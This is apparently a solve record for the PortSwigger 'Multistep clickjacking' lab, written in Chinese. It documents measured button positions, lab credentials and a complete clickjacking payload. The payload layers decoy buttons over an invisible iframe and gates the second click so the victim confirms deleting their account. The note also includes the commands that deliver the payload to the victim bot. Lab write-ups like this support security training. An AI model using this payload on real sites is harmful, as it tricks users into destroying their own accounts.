---
title: "lab-multistep"
links:
  - target: clickjacking-family
    relation: evidences
---

# lab-multistep

> evidences: [[clickjacking-family]]

- 题面:Multistep clickjacking(/web-security/clickjacking/lab-multistep)
- 实例:https://0a610094032c77e480cbd08d000f00ae.web-security-academy.net(`wiener:peter`)
- 利用服务器:https://exploit-0a9b00d3038e77738016cfac01ae0033.exploit-server.net
- 判定目标:两步诱导点击删号(Delete account → 确认 Yes);状态:**solved**(回马枪;交付后 solved_check true)

## 已确认

1. `/my-account` 同时有 `change-email-form` 与 **`delete-account-form`**(POST `/my-account/delete`,含 csrf),
   "Delete account" 按钮。
2. 量得(视口 500x700):**Delete account @ (16, 492.27, 167.73, 33)**;点它后 iframe 导航到
   `/my-account/delete`,确认页 **Yes @ (209.67, 288.09, 120, 33)**。
3. exploit:一个 iframe 框 `/my-account` + **两个诱饵**——`d1 "Click me first"` 覆盖 Delete 矩形、
   `d2 "Click me next"` 覆盖 Yes 矩形(均 z-index 1,iframe 半透明 z-index 2);**用 `iframe.onload` 计数,
   第 2 次 load(确认页)后才显示 d2**,保证第 2 击落在 Yes 上。
4. **本次 solves**:交付(`--follow`)后 `solved_check` true(顶层 `/beacon` 信标无命中 → bot 坐标点击)。

## 关键更正(相对 16:17 的 stuck 版)

- 旧版未解,疑“第 2 击过早(确认页未加载)”;本次用 `iframe.onload>=2` 门控 d2 → 成功。
- 旧“bot 元素级点击”假设不成立:无 beacon 命中而 solved,说明是坐标点击落进 iframe。

## 证据摘录

```
solved_check "https://0a610094032c77e480cbd08d000f00ae.web-security-academy.net/" --jar /tmp/b15c-jar3.json
 -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
exploit 服务器 banner is-notsolved → is-solved。
```

## 复现命令

```
lab_launch launch 5B7DC27B9539EC5079973204AADB5F58A9A78906B0A16BF6AF46CA0407ADA9A2 --widget-source /web-security/clickjacking/lab-multistep --jar /tmp/b15c-jar3.json
# exploit 体:
#  <style>#d1{position:fixed;left:16px;top:492px;width:168px;height:34px;z-index:1}#d2{position:fixed;left:210px;top:288px;width:120px;height:34px;z-index:1;display:none}#f{position:fixed;left:0;top:0;width:500px;height:700px;opacity:0.0001;z-index:2;border:0}</style>
#  <button id=d1>Click me first</button><button id=d2>Click me next</button><iframe id=f src="https://<inst>/my-account"></iframe>
#  <script>var n=0;document.getElementById('f').onload=function(){n++;if(n>=2){document.getElementById('d2').style.display='block'}}</script>
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=…' --form formAction=DELIVER_TO_VICTIM --follow
solved_check "<inst>/" --jar /tmp/b15c-jar3.json
```
